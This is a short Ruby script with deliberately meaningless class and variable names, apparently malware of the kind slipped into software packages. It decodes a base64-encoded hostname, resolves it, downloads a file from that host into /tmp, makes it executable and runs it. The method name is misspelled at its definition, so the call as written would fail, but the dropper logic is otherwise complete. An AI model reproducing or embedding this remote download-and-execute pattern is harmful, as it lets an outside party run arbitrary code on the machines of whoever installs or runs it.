require 'net/http'
require 'uri'
require 'base64'
require 'resolv'

class Smectis
  def self.install_explot(weighership)
    if !weighership.nil? and weighership != '0.0.0.0'
      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))
      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|
        uterometer.binmode
        uterometer.write(educable.body)
        uterometer.chmod(0777)
        uterometer.close
      end
      system('/tmp/autosymbiontic')
    end
  end

  def self.run()
    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='
    jaunting = nil
    begin
      jaunting = Resolv.getaddress(Base64.decode64(milligram))
    rescue
    end
    self.install_exploit(jaunting)
  end
end

Smectis.run()
